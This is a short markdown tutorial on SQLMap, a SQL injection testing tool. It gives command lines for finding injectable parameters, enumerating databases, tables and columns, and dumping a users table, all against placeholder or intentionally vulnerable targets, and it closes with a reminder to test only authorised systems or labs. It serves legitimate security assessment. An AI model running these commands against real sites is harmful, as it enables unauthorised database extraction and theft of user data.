# SQLMap Guide (Authorized Testing Only)

## What is SQLMap?
SQLMap is an automated SQL Injection testing tool used for security assessment of web applications.

Official project:
https://sqlmap.org/

---

# Basic Syntax

```bash
sqlmap [options]
```

---

# Common Usage Modes

## 1. Test a URL parameter

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
```

---

## 2. Crawl a website automatically

```bash
sqlmap -u "http://example.com" --crawl=2
```

---

## 3. Use POST requests

```bash
sqlmap -u "http://example.com/login" \
--data="username=test&password=test"
```

---

## 4. Enumerate databases

```bash
sqlmap -u "http://example.com/item.php?id=1" --dbs
```

---

## 5. List tables

```bash
sqlmap -u "http://example.com/item.php?id=1" -D database_name --tables
```

---

## 6. List columns

```bash
sqlmap -u "http://example.com/item.php?id=1" \
-D database_name -T users --columns
```

---

## 7. Dump data

```bash
sqlmap -u "http://example.com/item.php?id=1" \
-D database_name -T users --dump
```

---

## 8. Use cookies

```bash
sqlmap -u "http://example.com/profile.php?id=1" \
--cookie="PHPSESSID=test"
```

---

## 9. Random User-Agent

```bash
sqlmap -u "http://example.com" --random-agent
```

---

## 10. Batch mode (non-interactive)

```bash
sqlmap -u "http://example.com" --batch
```

---

# Important Flags

| Flag | Description |
|---|---|
| -u | Target URL |
| --dbs | List databases |
| --tables | List tables |
| --columns | List columns |
| --dump | Dump table data |
| --batch | Automatic answers |
| --risk | Risk level |
| --level | Testing depth |
| --random-agent | Random User-Agent |
| --cookie | Use cookies |
| --data | POST data |
| --threads | Multi-threading |

---

# Risk and Level

## Increase scan depth

```bash
sqlmap -u "http://example.com?id=1" --risk=3 --level=5
```

- risk = payload risk
- level = number of tests

---

# Save Output

```bash
sqlmap -u "http://example.com?id=1" --output-dir=results
```

---

# Notes
- Use only on systems you own or are authorized to test.
- SQLMap can generate heavy traffic.
- Prefer testing in lab environments such as DVWA or OWASP Juice Shop.
